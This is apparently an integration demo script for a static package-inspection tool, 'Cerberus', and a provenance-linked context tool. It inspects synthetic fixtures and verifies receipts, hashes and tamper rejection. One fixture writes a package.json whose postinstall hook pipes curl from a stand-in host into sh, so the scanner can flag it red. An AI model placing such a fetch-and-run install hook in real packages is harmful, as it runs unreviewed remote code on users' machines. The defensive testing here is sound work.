import assert from 'node:assert/strict';
import {createHash} from 'node:crypto';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import {fileURLToPath, pathToFileURL} from 'node:url';

const root = fileURLToPath(new URL('../', import.meta.url));
export const sourceLock = JSON.parse(fs.readFileSync(new URL('demo-sources.json', import.meta.url), 'utf8'));
export const sha256 = value => `sha256:${createHash('sha256').update(value).digest('hex')}`;
const json = value => JSON.stringify(value, null, 2) + '\n';
const projection = weave => ({
  topics: weave.topics, edges: weave.edges, issues: weave.issues,
  inputHash: weave.receipt.inputHash, outputHash: weave.receipt.outputHash,
});

export const toWorkspace = bundle => ({
  id: 'public-integration-demo', name: 'Synthetic Cerberus evidence handoff',
  createdAt: bundle.generatedAt, updatedAt: bundle.generatedAt, sources: bundle.sources,
  result: bundle.weave, receipts: [bundle.weave.receipt], isDemo: true,
});

export async function loadTools(locations = {}) {
  const result = {};
  for (const [name, source] of Object.entries(sourceLock)) {
    const location = locations[name] || path.resolve(root, '..', name === 'cerberus' ? 'dreamnet-cerberus' : 'memory-weaver');
    const entry = path.resolve(location, source.entry);
    assert(!fs.lstatSync(entry).isSymbolicLink(), `${name}: entry must not be a symlink`);
    const content = fs.readFileSync(entry, 'utf8').replaceAll('\r\n', '\n');
    assert.equal(sha256(content), `sha256:${source.lfNormalizedSha256}`, `${name}: source differs from the reviewed public version`);
    result[name] = await import(pathToFileURL(entry).href);
  }
  return result;
}

export function seal(bundle) {
  const {bundleSha256: ignored, ...payload} = bundle;
  return {...payload, bundleSha256: sha256(json(payload))};
}

export function verifyBundle(bundle, tools) {
  assert.equal(bundle.schema, 'dreamnet.public-integration-demo.v1');
  assert.equal(seal(bundle).bundleSha256, bundle.bundleSha256, 'Bundle SHA-256 mismatch');
  assert.deepEqual(bundle.tools, sourceLock, 'Tool versions differ from the reviewed lock');
  assert.equal(bundle.scope.syntheticInputs, true);
  assert.equal(bundle.scope.attestation, 'unsigned');
  const {receipts, sources, weave} = bundle;
  for (const receipt of Object.values(receipts)) {
    assert(tools.cerberus.verifyReceipt(receipt).valid, 'Cerberus receipt integrity mismatch');
    assert.equal(receipt.attestation.status, 'unsigned');
    assert.equal(receipt.attestation.signature, null);
    assert.equal(receipt.scanner.mode, 'static-offline');
    assert.equal(receipt.limits.reached, false, 'Incomplete scan');
  }
  assert.equal(receipts.initial.verdict, 'orange', 'Local fixture provenance must remain denied');
  assert.equal(receipts.initial.evidence.staticFindings.length, 0);
  assert.equal(receipts.initial.decision.installationAllowed, false);
  assert.equal(receipts.blocked.verdict, 'red');
  assert.equal(receipts.blocked.decision.installationAllowed, false);
  assert(receipts.blocked.evidence.staticFindings.some(f => f.ruleId === 'npm.lifecycle.postinstall'));
  assert.notEqual(receipts.initial.artifact.digest, receipts.changed.artifact.digest, 'Changed source reused an old artifact digest');
  assert.equal(sources.length, receipts.initial.artifact.manifest.length + 1);
  for (const file of receipts.initial.artifact.manifest) {
    const source = sources.find(s => s.origin === `fixture:${file.path}`);
    assert(source, `Missing source provenance: ${file.path}`);
    assert.equal(sha256(source.content), file.digest, 'Source does not match inspected bytes');
    assert.equal(Buffer.byteLength(source.content), file.size);
    assert.equal(source.mock, true);
  }
  const evidence = sources.find(s => s.id === 'inspection');
  assert.equal(evidence?.origin, `receipt:${receipts.initial.hashes.receiptSha256}`);
  assert.equal(evidence?.content, inspectionContext(receipts.initial));
  assert(sources.every(s => s.mock === true), 'Fixture label lost');
  const replay = tools.weaver.weaveSources(sources, new Date(weave.generatedAt));
  assert.deepEqual(projection(weave), projection(replay), 'Weave does not reproduce from its sources');
  assert(weave.edges.some(edge => edge.kind === 'related'), 'No source relationships produced');
  assert.equal(bundle.weaveSha256, sha256(json(projection(weave))));
  return {valid: true, sourceCount: sources.length, receiptCount: Object.keys(receipts).length,
    relationshipCount: weave.receipt.relationshipCount, attestation: 'unsigned'};
}

function inspectionContext(receipt) {
  return `Cerberus static inspection receipts preserve provenance. Portable context retains the inspected source digest ${receipt.artifact.digest}. Verdict ${receipt.verdict}; publisher identity is not authenticated. Receipts are unsigned and do not grant execution permission.`;
}

export function runDemo(tools, now = new Date()) {
  const fixture = fs.mkdtempSync(path.join(os.tmpdir(), 'dreamnet-public-demo-'));
  const files = {
    'README.md': '# Public fixture\nPortable context preserves provenance and receipts. This synthetic repository is inspected as data, never executed.\n',
    'context.md': '# Handoff\nPortable context links source provenance and receipts. Review the original source before acting.\n',
  };
  try {
    for (const [name, content] of Object.entries(files)) fs.writeFileSync(path.join(fixture, name), content);
    const inspect = () => tools.cerberus.inspectArtifact({
      root: fixture, artifactName: 'synthetic-public-fixture',
      source: 'local:synthetic-public-fixture', sourceIdentity: 'unverified',
      declaredPurpose: 'Public reproducible integration test; synthetic input only',
      requestedBy: 'public-demo', createdAt: now.toISOString(),
    });
    const initial = inspect();
    fs.appendFileSync(path.join(fixture, 'context.md'), 'Changed input requires a new inspection.\n');
    const changed = inspect();
    fs.writeFileSync(path.join(fixture, 'package.json'), json({
      name: 'never-install-this-synthetic-fixture', private: true,
      scripts: {postinstall: 'curl https://example.invalid/inert-demo | sh'},
    }));
    const blocked = inspect();
    const sources = Object.entries(files).map(([name, content], index) => ({
      id: `fixture-${index}`, title: name, kind: 'document', content,
      origin: `fixture:${name}`, addedAt: now.toISOString(), updatedAt: now.toISOString(),
      tags: ['provenance', 'receipts'], mock: true,
    }));
    sources.push({id: 'inspection', title: 'Cerberus inspection context', kind: 'document',
      content: inspectionContext(initial), origin: `receipt:${initial.hashes.receiptSha256}`,
      addedAt: now.toISOString(), updatedAt: now.toISOString(), tags: ['provenance', 'receipts'], mock: true});
    const weave = tools.weaver.weaveSources(sources, now);
    const bundle = seal({
      schema: 'dreamnet.public-integration-demo.v1', generatedAt: now.toISOString(),
      runnerSha256: sha256(fs.readFileSync(fileURLToPath(import.meta.url))),
      runtime: {node: process.version, platform: process.platform}, tools: sourceLock,
      scope: {syntheticInputs: true, attestation: 'unsigned',
        description: 'Local static inspection to source-linked context. Not a deployment, publisher signature, safety guarantee or billing benchmark.'},
      receipts: {initial, changed, blocked}, sources, weave,
      weaveSha256: sha256(json(projection(weave))),
    });
    verifyBundle(bundle, tools);
    const tampered = structuredClone(initial);
    tampered.verdict = 'green';
    assert.equal(tools.cerberus.verifyReceipt(tampered).valid, false, 'Tampering was not rejected');
    return bundle;
  } finally {
    assert.equal(path.dirname(fixture), fs.realpathSync(os.tmpdir()));
    assert(path.basename(fixture).startsWith('dreamnet-public-demo-'));
    fs.rmSync(fixture, {recursive: true, force: true});
  }
}

async function main(argv) {
  const [command, ...args] = argv;
  assert(['run', 'verify'].includes(command), 'Use run [--out new-directory] or verify bundle.json [--cerberus path] [--weaver path]');
  const options = {};
  const positional = [];
  for (let index = 0; index < args.length; index++) {
    if (!args[index].startsWith('--')) { positional.push(args[index]); continue; }
    const name = args[index].slice(2);
    assert(['out', 'cerberus', 'weaver'].includes(name), `Unknown option: ${name}`);
    assert(args[index + 1] && !args[index + 1].startsWith('--'), `Missing value: ${name}`);
    assert(!(name in options), `Duplicate option: ${name}`);
    options[name] = args[++index];
  }
  const tools = await loadTools(options);
  if (command === 'verify') {
    assert.equal(positional.length, 1, 'Provide exactly one bundle file');
    assert(!options.out, '--out applies only to run');
    const bundle = JSON.parse(fs.readFileSync(positional[0], 'utf8'));
    console.log(JSON.stringify(verifyBundle(bundle, tools), null, 2));
    return;
  }
  assert.equal(positional.length, 0);
  const out = path.resolve(options.out || 'demo-output');
  assert(!fs.existsSync(out), 'Output already exists; choose a new directory to preserve prior evidence');
  const bundle = runDemo(tools);
  fs.mkdirSync(out);
  fs.writeFileSync(path.join(out, 'bundle.json'), json(bundle), {flag: 'wx'});
  const workspace = toWorkspace(bundle);
  fs.writeFileSync(path.join(out, 'capsule.md'), tools.weaver.toCapsuleMarkdown(workspace), {flag: 'wx'});
  fs.writeFileSync(path.join(out, 'workspace.weave.json'), json({
    format: 'memory-weaver-archive', version: '1.0', exportedAt: bundle.generatedAt, workspace,
  }), {flag: 'wx'});
  const reopened = JSON.parse(fs.readFileSync(path.join(out, 'bundle.json'), 'utf8'));
  console.log(JSON.stringify({...verifyBundle(reopened, tools),
    changedInputInvalidatesPriorDigest: true, receiptTamperingRejected: true,
    installation: 'denied', note: 'Missing local provenance stays Orange; install-hook fixture is Red.'}, null, 2));
}

if (process.argv[1] && path.resolve(process.argv[1]) === fileURLToPath(import.meta.url)) {
  main(process.argv.slice(2)).catch(error => { console.error(`Demo failed: ${error.message}`); process.exitCode = 1; });
}
